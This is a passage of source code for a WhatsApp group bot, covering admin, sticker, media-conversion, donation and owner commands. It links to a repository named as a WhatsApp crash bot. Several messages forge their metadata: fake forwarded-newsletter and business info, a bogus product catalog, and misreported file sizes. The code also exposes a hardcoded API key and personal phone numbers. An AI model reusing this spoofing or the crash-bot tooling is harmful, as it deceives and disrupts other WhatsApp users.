                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    Yosh.groupSettingUpdate(m.chat, 'announcement')
                    replygcYosh(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcYosh('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replygcYosh(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    Yosh.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcYosh(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Yosh.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replygcYosh(json(res))).catch((err) => replygcYosh(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (!text) return 'Text ?'
                await Yosh.groupUpdateSubject(m.chat, text).then((res) => replygcYosh(mess.success)).catch((err) => replygcYosh(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (!text) return 'Text ?'
                await Yosh.groupUpdateDescription(m.chat, text).then((res) => replygcYosh(mess.success)).catch((err) => replygcYosh(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (!quoted) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcYosh(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await Yosh.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await Yosh.query({
                        tag: 'iq',
                        attrs: {
  to: m.chat,
  type: 'set',
  xmlns: 'w:profile:picture'
                        },
                        content: [{
  tag: 'picture',
  attrs: {
      type: 'image'
  },
  content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcYosh(mess.done)
                } else {
                    var memeg = await Yosh.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcYosh(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                Yosh.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                Yosh.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (!isAdmins) return replygcYosh(mess.admin)
                if (!m.quoted) return replygcYosh(`Reply messages with captions ${prefix + command}`)
                Yosh.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (args[0] === 'close') {
                    await Yosh.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcYosh(`Success In Closing The Group 🕊️`)).catch((err) => replygcYosh(json(err)))
                } else if (args[0] === 'open') {
                    await Yosh.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcYosh(`Success In Opening The Group 🕊️`)).catch((err) => replygcYosh(json(err)))
                } else {
                    replygcYosh(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                if (args[0] === 'open') {
                    await Yosh.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcYosh(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcYosh(json(err)))
                } else if (args[0] === 'close') {
                    await Yosh.groupSettingUpdate(m.chat, 'locked').then((res) => replygcYosh(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcYosh(json(err)))
                } else {
                    replygcYosh(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                let response = await Yosh.groupInviteCode(m.chat)
                Yosh.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replygcYosh(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replygcYosh(mess.admin)
                if (!isBotAdmins) return replygcYosh(mess.botAdmin)
                await Yosh.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcYosh(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replygcYosh(json(err)))
                break
                case 'p':
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
                await Yosh.sendMessage(m.chat, {
                    text: respon,
                    contextInfo: {
                        externalAdReply: {
  showAdAttribution: true,
  title: `${botname}`,
  body: `${latensi.toFixed(4)} Second`,
  thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
  sourceUrl: global.link,
  mediaType: 1,
  renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await Yosh.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
  showAdAttribution: true,
  title: `${botname}`,
  body: `${ownername}`,
  thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
  sourceUrl: global.link,
  mediaType: 1,
  renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `▶ Bots Have Been Running For ${runtime(process.uptime())}`
                Yosh.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
  showAdAttribution: true,
  title: `${botname}`,
  body: `FORGET DONATE`,
  thumbnailUrl: 'https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg',
  sourceUrl: global.link,
  mediaType: 1,
  renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
           case 'script':
            case 'scriptbot':
              const mediaaja = await prepareWAMessageMedia({
                'image': await fetch('https://telegra.ph/file/a75c7d8c0c8062e7322b5.jpg')
              }, {
                'upload': Yosh.waUploadToServer
              });
    let msgtp = generateWAMessageFromContent(m.chat, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'contextInfo': {
              'mentionedJid': null,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "0@newsletter",
                'newsletterName': "Powered By 🦄 SATARUZ",
                'serverMessageId': -1
              },
              'businessMessageForwardInfo': {
                'businessOwnerJid': "0@s.whatsapp.net"
              },
              'externalAdReply': {
                'title': "🦄 SATARUZ",
                'thumbnailUrl': 'https://telegra.ph/file/40da4c69c82e244a72500.jpg',
                'sourceUrl': '',
                'mediaType': 1,
                'renderLargerThumbnail': true
              }
            },
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': `⛩️• Name : " ${pushname} "`
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': "➤ FREE SOURCE CODE By: TeamCassaster"
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': "`</> Source Code </>`\n",
              'subtitle': '--',
              'hasMediaAttachment': true,
              ...mediaaja
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': 'cta_url',
                'buttonParamsJson': "{\"display_text\":\"🌐 SourceCode\",\"url\":\"https://github.com/YoshCasaster/BOT-CRASH-WHATSAPP\",\"merchant_url\":\"https://github.com/YoshCasaster/BOT-CRASH-WHATSAPP\"}"
              },]
            })
          })
        },
        'contextInfo': {
          'forwardingScore': 289,
          'isForwarded': true,
          'mentionedJid': null,
          'businessMessageForwardInfo': {
            'businessOwnerJid': "6288980818668@s.whatsapp.net"
          },
          'forwardedNewsletterMessageInfo': {
            'newsletterJid': "120363192485906802@newsletter",
            'serverMessageId': 1,
            'newsletterName': "🦄 SATARUZ "
          }
        }
      }
    }, {
      'quoted': m
    });
    Yosh.relayMessage(m.chat, msgtp.message, {});
    break;






     
          
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                Yosh.sendMessage(m.chat, {
                    text: 'DANA : 088980818668\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
    const p = ownernomer;
    let pp = await Yosh.profilePictureUrl(`${p}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
    let owner = `wa.me/${p}`;
    let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp; BANG SYAII\nNICKNAME:🔰 DEVELOPER\nORG: ${ownername}\nTITLE:soft\nitem1.TEL;waid=${ownernomer}:${ownernomer}\nitem1.X-ABLabel:Contact Owner\nitem2.URL:https://wa.me/${ownernomer}\nitem2.X-ABLabel:💬 More\nitem3.EMAIL;type=INTERNET:wa.me/6288226772171\nitem3.X-ABLabel:Email\nitem4.ADR:;;🇮🇩 Indonesia;;;;\nitem4.X-ABADR:💬 More\nitem4.X-ABLabel:Lokasi\nBDAY;value=19-01-2008\nEND:VCARD`;
  
    const sentMsg = await Yosh.sendMessage(m.chat, {
      contacts: {
        displayName: wm,
        contacts: [{ vcard }]
      },
      contextInfo: {
        externalAdReply: {
          title: `☠️ SATARUZ 💀`,
          body: wm,
          thumbnailUrl: pp,
          sourceUrl: null,
          mediaType: 1,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m});
    Yosh.sendMessage(from,  "*❕ he is my owner, if you want to report a bug contact him*", sentMsg);

    const messa = await prepareWAMessageMedia({ image: await fetch('https://telegra.ph/file/84c1a59a07c6e02786b96.png') }, { upload: Yosh.waUploadToServer }) 
     
    const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ 
    "productMessage": { 
    "product": { 
    "productImage": messa.imageMessage,  
    "productId": "24247274218253420", 
    "title": '❗❕ MALAIKAT PINJOL ❗❕', 
    "description": 'G Target G Cuan', 
    "currencyCode": "IDR", 
    "bodyText": 'wm', 
    "footerText": 'wm', 
    "priceAmount1000": "15000000", 
    "productImageCount": 3, 
    "firstImageId": 2, 
    "salePriceAmount1000": "15000000", 
    "retailerId": 'wm', 
    "url": "https://wa.me/p/24247274218253420/" + Yosh.user.id.split('@')[0]
    }, 
    "businessOwnerJid": Yosh.user.id,
    } 
    }), { userJid: m.chat, quoted: m })     
     
    Yosh.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id });
 
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replygcYosh(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await Yosh.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcYosh('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await Yosh.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replygcYosh(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replygcYosh(respond)
                if (!text) return replygcYosh(respond)
                await loading()
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await Yosh.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await Yosh.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replygcYosh(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
Yosh.downloadAndSaveMediaMessage(quoted, "gifee")
Yosh.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Yosh.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcYosh('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await Yosh.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcYosh(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcYosh(`Reply sticker with caption *${prefix + command}*`)
                await loading()
                let media = await Yosh.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    Yosh.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcYosh(`Reply sticker with caption *${prefix + command}*`)
                await loading()
                let media = await Yosh.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Yosh.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcYosh(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                await loading()
                let media = await Yosh.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Yosh.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcYosh(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                await loading()
                let media = await Yosh.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Yosh.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgYosh.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcYosh(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                await loading()
                let media = await Yosh.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                Yosh.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcYosh(`Reply sticker with caption *${prefix + command}*`)
                await loading()
                let media = await Yosh.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Yosh.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
              await loading()
                
                let media = await Yosh.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcYosh(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcYosh(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcYosh(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcYosh(`Example : ${prefix + command} 😅+🤔`)
                await loading()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await Yosh.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcYosh(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await Yosh.downloadAndSaveMediaMessage(quoted)
                    Yosh.sendMessage(m.chat, {
                        image: {
  url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await Yosh.downloadAndSaveMediaMessage(quoted)
                    Yosh.sendMessage(m.chat, {
                        video: {
  url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replygcYosh(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await Yosh.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcYosh(`Example:\n${prefix}fliptext Yoshy`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcYosh(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteYosh) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteYosh.length}*`
                replygcYosh(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerYosh) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerYosh.length}*`
                replygcYosh(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageYosh) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageYosh.length}*`
                replygcYosh(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoYosh) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoYosh.length}*`
                replygcYosh(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replygcYosh(mess.owner)
if (!args[0]) return replygcYosh(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Yosh.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcYosh(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcYosh(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replygcYosh(mess.owner)
if (!args[0]) return replygcYosh(`Use ${prefix+command} nomor\nExample ${prefix+command} 62815540932401`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcYosh(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Video Name?')
                if (VideoYosh.includes(q)) return replygcYosh("The name you entered already exists")
                let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
                VideoYosh.push(q)
                await fsx.copy(delb, `./YoshMedia/video/${q}.mp4`)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoYosh))
                fs.unlinkSync(delb)
                replygcYosh(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the Video Name')
                if (!VideoYosh.includes(q)) return replygcYosh("Name Does Not Exist in Database")
                let wanu = VideoYosh.indexOf(q)
                VideoYosh.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoYosh))
                fs.unlinkSync(`./YoshMedia/video/${q}.mp4`)
                replygcYosh(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('The name of the image?')
                if (ImageYosh.includes(q)) return replygcYosh("The name you entered is already registered in the database")
                let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
                ImageYosh.push(q)
                await fsx.copy(delb, `./YoshMedia/image/${q}.jpg`)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageYosh))
                fs.unlinkSync(delb)
                replygcYosh(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the Image Name')
                if (!ImageYosh.includes(q)) return replygcYosh("The image name you entered is not registered")
                let wanu = ImageYosh.indexOf(q)
                ImageYosh.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageYosh))
                fs.unlinkSync(`./YoshMedia/image/${q}.jpg`)
                replygcYosh(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the name of the sticker?')
                if (StickerYosh.includes(q)) return replygcYosh("Name Already In Use")
                let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
                StickerYosh.push(q)
                await fsx.copy(delb, `./YoshMedia/sticker/${q}.webp`)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerYosh))
                fs.unlinkSync(delb)
                replygcYosh(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the name of the sticker')
                if (!StickerYosh.includes(q)) return replygcYosh("Name Not Registered in Database")
                let wanu = StickerYosh.indexOf(q)
                StickerYosh.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerYosh))
                fs.unlinkSync(`./YoshMedia/sticker/${q}.webp`)
                replygcYosh(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcYosh(mess.prem)
                if (args.length < 1) return replygcYosh('Enter the Name?')
                if (VoiceNoteYosh.includes(q)) return replygcYosh("Name Already In Use")
                let delb = await Yosh.downloadAndSaveMediaMessage(quoted)
                VoiceNoteYosh.push(q)
                await fsx.copy(delb, `./YoshMedia/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteYosh))
